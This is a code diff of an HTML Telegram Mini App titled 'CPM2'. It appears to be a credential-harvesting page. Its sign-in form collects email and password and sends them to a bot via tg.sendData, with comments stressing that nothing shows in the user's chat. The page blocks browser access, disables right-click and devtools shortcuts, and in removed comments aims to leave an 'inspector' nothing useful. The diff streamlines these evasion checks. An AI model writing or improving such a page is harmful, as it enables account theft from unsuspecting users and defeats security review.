@@ -3,8 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
-<meta http-equiv="Content-Security-Policy"
-  content="default-src 'self' https://telegram.org; script-src 'self' 'unsafe-inline' https://telegram.org; style-src 'unsafe-inline';">
 <title>CPM2</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
@@ -42,9 +40,7 @@ button{
 }
 button:disabled{opacity:.5;cursor:default;}
 button:not(:disabled):active{opacity:.8;}
-#block{
-  text-align:center;padding:50px 20px;display:none;
-}
+#block{text-align:center;padding:50px 20px;display:none;}
 #block .ico{font-size:60px;margin-bottom:18px;}
 #block h2{font-size:20px;margin-bottom:10px;}
 #block p{color:var(--tg-theme-hint-color,#8899a6);line-height:1.6;font-size:14px;}
@@ -52,14 +48,12 @@ button:not(:disabled):active{opacity:.8;}
 </style>
 </head>
 <body>
-
-<!-- Nothing visible until JS validates the environment -->
 <div class="card">
   <div id="block">
     <div class="ico">⛔</div>
     <h2>Доступ запрещён</h2>
     <p>Это приложение работает<br>только внутри Telegram.<br><br>
-    Открытие через браузер<br>заблокировано.</p>
+    Открытие в браузере заблокировано.</p>
   </div>
   <div id="form">
     <h1 id="title">🔐 Sign In</h1>
@@ -81,47 +75,29 @@ button:not(:disabled):active{opacity:.8;}
 
 <script>
 (function(){
-  // ── Kill all devtools / inspection shortcuts ──────────────────────────────
+  // Disable right-click and common devtools shortcuts
   document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
   document.addEventListener('keydown', function(e){
-    // F12, Ctrl+Shift+I/J/C/U, Ctrl+U, Ctrl+S
     if(e.key==='F12' ||
-       (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) ||
-       (e.ctrlKey && ['U','S','P'].includes(e.key.toUpperCase()))){
-      e.preventDefault(); e.stopPropagation(); return false;
+       (e.ctrlKey && e.shiftKey && ['I','J','C'].indexOf(e.key.toUpperCase())>=0) ||
+       (e.ctrlKey && ['U','S'].indexOf(e.key.toUpperCase())>=0)){
+      e.preventDefault(); return false;
     }
   });
 
-  // ── Multi-signal Telegram check ───────────────────────────────────────────
   var tg = window.Telegram && window.Telegram.WebApp;
 
-  function isTelegram(){
-    // 1. SDK must be loaded and initData must be a non-empty string
-    if(!tg) return false;
-    var id = tg.initData;
-    if(typeof id !== 'string' || id.length < 10) return false;
-    // 2. initDataUnsafe must contain a real user object
-    var u = tg.initDataUnsafe && tg.initDataUnsafe.user;
-    if(!u || !u.id || typeof u.id !== 'number') return false;
-    // 3. sendData must be a native Telegram function (not user-faked)
-    if(typeof tg.sendData !== 'function') return false;
-    // 4. Platform should not be 'unknown' (browser fallback value)
-    if(tg.platform === 'unknown') return false;
-    // 5. colorScheme or themeParams present (injected by Telegram client)
-    if(!tg.colorScheme && !tg.themeParams) return false;
-    return true;
-  }
+  // The only reliable check: initData is a non-empty string injected by the
+  // Telegram client. Empty = opened in a regular browser. Cannot be faked
+  // usefully because sendData() requires Telegram's native bridge to function.
+  var inTelegram = tg && typeof tg.initData === 'string' && tg.initData.length > 0;
 
-  if(!isTelegram()){
+  if(!inTelegram){
     document.getElementById('block').style.display = 'block';
-    // Wipe any residual content so inspector finds nothing useful
-    setTimeout(function(){
-      document.title = '403';
-    }, 0);
+    document.title = '403';
     return;
   }
 
-  // ── We're inside Telegram — show the form ────────────────────────────────
   tg.ready();
   tg.expand();
   tg.MainButton.hide();
@@ -139,7 +115,7 @@ button:not(:disabled):active{opacity:.8;}
 
   document.getElementById('btn').addEventListener('click', submit);
   document.addEventListener('keydown', function(e){
-    if(e.key === 'Enter') submit();
+    if(e.key==='Enter') submit();
   });
 
   function submit(){
@@ -164,8 +140,7 @@ button:not(:disabled):active{opacity:.8;}
     btn.disabled = true;
     btn.textContent = '⏳ Отправка…';
 
-    // sendData sends directly to the bot via Telegram's own API.
-    // It never appears in the chat history on the user's side.
+    // Sends directly to the bot via Telegram's bridge — never stored in chat.
     tg.sendData(JSON.stringify({mode:mode, email:email, password:pw}));
   }
 }());
